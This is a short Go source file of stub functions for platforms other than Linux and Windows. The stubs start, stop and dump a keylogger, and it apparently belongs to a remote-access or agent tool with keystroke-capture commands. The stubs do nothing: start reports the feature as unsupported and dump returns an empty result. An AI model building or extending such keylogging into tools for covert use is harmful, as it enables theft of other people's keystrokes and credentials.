//go:build !linux && !windows

package main

func keylogStart(dev string) Result {
	return Result{OK: false, Err: "keylog unsupported on this OS"}
}

func keylogStop() Result {
	return Result{OK: true, Out: "stopped"}
}

func keylogDump(clear bool) Result {
	return Result{OK: true, Out: "(empty)"}
}